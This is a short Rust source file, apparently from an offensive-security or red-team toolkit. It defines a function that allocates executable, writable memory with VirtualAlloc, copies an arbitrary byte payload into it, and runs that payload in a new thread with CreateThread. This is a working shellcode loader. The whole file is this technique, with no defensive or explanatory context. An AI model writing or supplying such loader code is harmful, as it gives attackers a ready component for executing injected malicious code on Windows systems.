use std::mem;

use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
};

#[allow(dead_code)]
pub fn create_thread(payload: &[u8]) {
    let address = unsafe { VirtualAlloc(None, payload.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    unsafe { std::ptr::copy(payload.as_ptr(), address.cast(), payload.len()) };
    let mut thread_id = 0u32;
    let handle = unsafe {
        CreateThread(
            None,
            0,
            Some(mem::transmute(address)),
            None,
            THREAD_CREATION_FLAGS(0),
            Some(&mut thread_id),
        )
    };
    match handle {
        Ok(handle) => {
            println!("[+] CreateThread: {}", thread_id);
            unsafe {
                WaitForSingleObject(handle, INFINITE);
            }
        }
        Err(error) => {
            eprintln!("[+] CreateThread error: {}", error);
        }
    }
}
